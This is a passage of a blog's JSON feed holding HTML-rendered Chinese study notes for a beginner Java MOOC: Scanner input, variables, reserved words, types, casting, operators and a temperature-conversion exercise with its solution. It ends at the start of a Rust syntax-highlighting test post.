number\">9</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Extremely strong signals\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t\t<span class=\"token keyword\">switch</span><span class=\"token punctuation\">(</span>readability<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", unreadable.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", barely readable, occasional words distinguishable.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", readable with considerable difficulty.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", readable with practically no difficulty.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t\t\t<span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t\t\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", perfectly readable.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "Java",
                "零基础学Java语言-浙江大学-翁恺"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/computer-science/java/course-1/week-1/",
            "url": "https://zephyr-cyber.github.io.git/computer-science/java/course-1/week-1/",
            "title": "第1周 计算",
            "date_published": "2020-04-12T12:46:25.000Z",
            "content_html": "<p>:::note info<br />\n 以下为个人学习笔记和习题整理<br />\n课程：零基础学 Java 语言 - 浙江大学 - 翁恺 @ 中国大学 MOOC<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWNvdXJzZTE2My5vcmcvY291cnNlL1pKVS0xMDAxNTQxMDAx\">https://www.icourse163.org/course/ZJU-1001541001</span><br />\n:::</p>\n<h1 id=\"课堂笔记\"><a class=\"anchor\" href=\"#课堂笔记\">#</a> 课堂笔记</h1>\n<h2 id=\"读输入-字符串输出\"><a class=\"anchor\" href=\"#读输入-字符串输出\">#</a> 读输入、字符串输出</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"><span>scanner</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Scanner</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">Scanner</span> in <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Scanner</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 输入 Scan 之后，按下键盘 Alt + “/” 键，Eclipse 下自动补全。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>in<span class=\"token punctuation\">.</span><span class=\"token function\">nextLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// 让 in 这个对象做读入下一行的动作，结果交给 System.out 这个对象去打印一行。</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 字符串的 + 用来连接两个字符串形成更长的字符串。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\" world.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello\"</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>tips：</p>\n<ul>\n<li><code>System.out.println</code>  会换行， <code>System.out.print</code>  则不会换行</li>\n<li>出现警告： <code>Resource leak: 'in' is never closed</code> ，可以在函数的最后加入</li>\n</ul>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>in<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 释放</span></pre></td></tr></table></figure><h2 id=\"变量\"><a class=\"anchor\" href=\"#变量\">#</a> 变量</h2>\n<ul>\n<li>\n<p><strong>形式</strong>：&lt;类型名称&gt; &lt; 变量名称 &gt; = &lt; 初始值 &gt;<br />\n <code>int price, amount; // 同时定义两个变量</code> <br />\n <code>int price = 0; // 定义变量并赋值</code> <br />\n <code>int price, amount = 100, age;</code></p>\n</li>\n<li>\n<p><strong>类型名称</strong>：Java 是一种<strong>强类型语言</strong>，所有变量在使用前必须定义或声明，所有变量必须具有确定的数据类型。数据类型表示在变量中可以存放什么样的数据，程序运行过程中也不能改变变量的类型。</p>\n</li>\n<li>\n<p><strong>变量名称</strong>：又称标识符，只能由字母、数字、下划线构成，数字不能出现在第一个位置。此外，Java 的保留字也不能用作标识符。</p>\n</li>\n<li>\n<p>Java 的保留字列表</p>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>abstract</th>\n<th>do</th>\n<th>implements</th>\n<th>protected</th>\n<th>throws</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>boolean</td>\n<td>double</td>\n<td>import</td>\n<td>public</td>\n<td>transient</td>\n</tr>\n<tr>\n<td>break</td>\n<td>else</td>\n<td>instanceof</td>\n<td>return</td>\n<td>true</td>\n</tr>\n<tr>\n<td>byte</td>\n<td>extends</td>\n<td>int</td>\n<td>short</td>\n<td>try</td>\n</tr>\n<tr>\n<td>case</td>\n<td>false</td>\n<td>interface</td>\n<td>static</td>\n<td>while</td>\n</tr>\n<tr>\n<td>catch</td>\n<td>final</td>\n<td>long</td>\n<td>strictfp</td>\n<td>void</td>\n</tr>\n<tr>\n<td>char</td>\n<td>finally</td>\n<td>native</td>\n<td>super</td>\n<td>volatile</td>\n</tr>\n<tr>\n<td>class</td>\n<td>float</td>\n<td>new</td>\n<td>switch</td>\n</tr>\n<tr>\n<td>const*</td>\n<td>for</td>\n<td>null</td>\n<td>synchronized</td>\n</tr>\n<tr>\n<td>continue</td>\n<td>goto*</td>\n<td>package</td>\n<td>this</td>\n</tr>\n<tr>\n<td>default</td>\n<td>if</td>\n<td>private</td>\n<td>throw</td>\n</tr>\n</tbody>\n</table>\n<ul class=\"task-list\">\n<li>以下哪些标识符是符合规则的？</li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_0\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_0\"> currency</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_1\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_1\"> lastName</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_2\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_2\"> fireplace</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_3\" disabled=\"true\" /><label for=\"cbx_3\"> _last_name</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_4\" checked=\"true\" disabled=\"true\" /><label for=\"cbx_4\"> xingmin</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_5\" disabled=\"true\" /><label for=\"cbx_5\"> class</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_6\" disabled=\"true\" /><label for=\"cbx_6\"> goto</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_7\" disabled=\"true\" /><label for=\"cbx_7\"> 4ever</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_8\" disabled=\"true\" /><label for=\"cbx_8\"> time-machine</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_9\" disabled=\"true\" /><label for=\"cbx_9\"> Int</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_10\" disabled=\"true\" /><label for=\"cbx_10\"> $12</label></li>\n<li class=\"task-list-item\"><input type=\"checkbox\" id=\"cbx_11\" disabled=\"true\" /><label for=\"cbx_11\"> 我是变量</label></li>\n</ul>\n<h2 id=\"常量-final\"><a class=\"anchor\" href=\"#常量-final\">#</a> 常量 final</h2>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">final</span> <span class=\"token keyword\">int</span> AMOUNT <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//final 是一个修饰符，表示这个变量的值一旦初始化，就不能再修改了。</span></pre></td></tr></table></figure><h2 id=\"变量类型\"><a class=\"anchor\" href=\"#变量类型\">#</a> 变量类型</h2>\n<h3 id=\"整数-int\"><a class=\"anchor\" href=\"#整数-int\">#</a> 整数 int</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> price <span class=\"token operator\">=</span> in<span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>如果用户输入的不是整数，则会报错  <code>java.util.InputMismatchException</code> 。</li>\n<li>程序要求读入多个数字时，可以在一行输入，中间用空格分开，也可以多行输入。</li>\n<li>每次召唤 <code>in.nextInt()</code> ，它就等待用户输入一个整数。</li>\n<li>两个整数的运算结果只能是整数。</li>\n<li>在 Java 中， <code>10</code>  和 <code>10.0</code>  是完全不同的数。</li>\n</ul>\n<h3 id=\"浮点数-double\"><a class=\"anchor\" href=\"#浮点数-double\">#</a> 浮点数 double</h3>\n<ul>\n<li><strong>浮点数运算有误差</strong>：由于二进制的自身限制，浮点计算需要将十进制先转换为二进制，然后对二进制数进行计算，因此导致误差。</li>\n</ul>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token number\">1.2</span><span class=\"token operator\">-</span><span class=\"token number\">1.1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 结果为 0.09999999999999987</span></pre></td></tr></table></figure><ul>\n<li>整数类型不能表达有小数部分的数；整数运算速度快，占内存小；日常中整数运算多。</li>\n</ul>\n<h2 id=\"赋值运算\"><a class=\"anchor\" href=\"#赋值运算\">#</a> 赋值运算</h2>\n<h3 id=\"强制类型转换\"><a class=\"anchor\" href=\"#强制类型转换\">#</a> 强制类型转换</h3>\n<ul>\n<li>浮点数和整数放在一起运算时，Java 会将整数转换成浮点数，然后进行浮点数运算。</li>\n<li>强制性转换的优先级高于四则运算。</li>\n</ul>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">double</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1.0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">double</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2.0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>a<span class=\"token operator\">/</span>b<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 会报错</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">/</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 不会报错</span></pre></td></tr></table></figure><h3 id=\"运算符优先级\"><a class=\"anchor\" href=\"#运算符优先级\">#</a> 运算符优先级</h3>\n<ul>\n<li>单目运算符 <code>+</code>   <code>-</code>  优先级最高</li>\n<li>结合关系一般自左向右，单目 <code>+</code>   <code>-</code>  和赋值 <code>=</code>  自右向左。</li>\n</ul>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>result <span class=\"token operator\">=</span> a <span class=\"token operator\">=</span> b <span class=\"token operator\">=</span> <span class=\"token number\">3</span> <span class=\"token operator\">+</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>result <span class=\"token operator\">=</span> result <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">6</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>result <span class=\"token operator\">=</span> <span class=\"token number\">3</span> <span class=\"token operator\">+</span> result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"复合赋值\"><a class=\"anchor\" href=\"#复合赋值\">#</a> 复合赋值</h3>\n<ul>\n<li>5 个算术运算符， <code>+ - * / %</code> ，可以和赋值运算符  <code>=</code>  结合起来，形成复合赋值运算。注意，两个运算符中间不要有空格。</li>\n</ul>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>total <span class=\"token operator\">+=</span> <span class=\"token punctuation\">(</span>sum<span class=\"token operator\">+</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>total <span class=\"token operator\">=</span> total <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>sum<span class=\"token operator\">+</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>total <span class=\"token operator\">*</span> <span class=\"token operator\">=</span> sum<span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>total <span class=\"token operator\">=</span> total<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>sum<span class=\"token operator\">+</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>total <span class=\"token operator\">/=</span> <span class=\"token number\">12</span><span class=\"token operator\">+</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>total <span class=\"token operator\">=</span> total <span class=\"token operator\">/</span> <span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token operator\">+</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>递增递减运算符  <code>++</code>   <code>--</code> ，给变量 + 1 或 - 1</li>\n<li>前缀后缀：</li>\n</ul>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>t1 <span class=\"token operator\">=</span> a<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//t1 先被赋值为 a 即 14， a 自加到 15</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>t2 <span class=\"token operator\">=</span> <span class=\"token operator\">++</span>a<span class=\"token punctuation\">;</span> <span class=\"token comment\">//a 先自加到 15，t2 被赋值为 a 即 15</span></pre></td></tr></table></figure><h1 id=\"编程题\"><a class=\"anchor\" href=\"#编程题\">#</a> 编程题</h1>\n<h2 id=\"题目1-温度转换5分\"><a class=\"anchor\" href=\"#题目1-温度转换5分\">#</a> 题目 1. 温度转换（5 分）</h2>\n<ul>\n<li>\n<p><strong>题目内容</strong><br />\n写一个将华氏温度转换成摄氏温度的程序，转换的公式是：</p>\n<p><code>°F = (9/5)*°C + 32</code></p>\n<p>其中 C 表示摄氏温度，F 表示华氏温度。</p>\n<p>程序的输入是一个整数，表示华氏温度。输出对应的摄氏温度，也是一个整数。</p>\n<p>提示，为了把计算结果的浮点数转换成整数，需要使用下面的表达式：</p>\n<p><code>(int)x;</code></p>\n<p>其中 x 是要转换的那个浮点数。</p>\n<p><em>注意：除了题目要求的输出，不能输出任何其他内容，比如输入时的提示，输出时的说明等等都不能。这道题目要求转换后的数字，程序就只能输出这个数字，除此之外任何内容都不能输出。</em></p>\n</li>\n<li>\n<p><strong>输入格式</strong><br />\n一个整数。</p>\n</li>\n<li>\n<p><strong>输出格式</strong><br />\n一个整数。</p>\n</li>\n<li>\n<p><strong>输入样例</strong><br />\n 100</p>\n</li>\n<li>\n<p><strong>输出样例</strong><br />\n 37</p>\n</li>\n</ul>\n<h3 id=\"解题代码\"><a class=\"anchor\" href=\"#解题代码\">#</a> 解题代码</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Scanner</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token class-name\">Scanner</span> in <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Scanner</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token comment\">// 获得输入的整数</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">int</span> fahrenheit <span class=\"token operator\">=</span> in<span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token comment\">// 计算摄氏度</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token keyword\">double</span> centigrade <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>fahrenheit <span class=\"token operator\">-</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token punctuation\">(</span><span class=\"token number\">9</span> <span class=\"token operator\">/</span> <span class=\"token number\">5.0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token comment\">// 将浮点数转换为整数输出</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>centigrade<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "Java",
                "零基础学Java语言-浙江大学-翁恺"
            ]
        },
        {
            "id": "https://zephyr-cyber.github.io.git/code-highlight/",
            "url": "https://zephyr-cyber.github.io.git/code-highlight/",
            "title": "Code Highlight Style test",
            "date_published": "2019-07-25T08:43:00.000Z",
            "content_html": "<p>Make sure all the code blocks highlighted correctly. All the code samples are come from the demo of <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdobGlnaHRqcy5vcmc=\">https://highlightjs.org</span></p>\n<p><span id=\"more\"></span></p>\n<figure class=\"highlight plain\"><figcaption data-lang=\"plain\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book.</pre></td></tr></table></figure><figure class=\"highlight rust\"><figcaption data-lang=\"rust\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token attribute attr-name\">#[derive(Debug)]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">pub</span> <span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">State</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token class-name\">Start</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">Transient</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token class-name\">Closed</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">impl</span> <span class=\"token class-name\">From</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">&amp;</span><span class=\"token lifetime-annotation symbol\">'a</span> <span class=\"token keyword\">str</span><span class=\"token operator\">></span> <span class=\"token keyword\">for</span> <span class=\"token class-name\">State</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">from</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token lifetime-annotation symbol\">'a</span> <span class=\"token keyword\">str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">Self</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">match</span> s <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token string\">\"start\"</span> <span class=\"token operator\">=></span> <span class=\"token class-name\">State</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Start</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token string\">\"closed\"</span> <span class=\"token operator\">=></span> <span class=\"token class-name\">State</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Closed</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            _ <span class=\"token operator\">=></span> <span class=\"token macro property\">unreachable!</span><span class=\"token 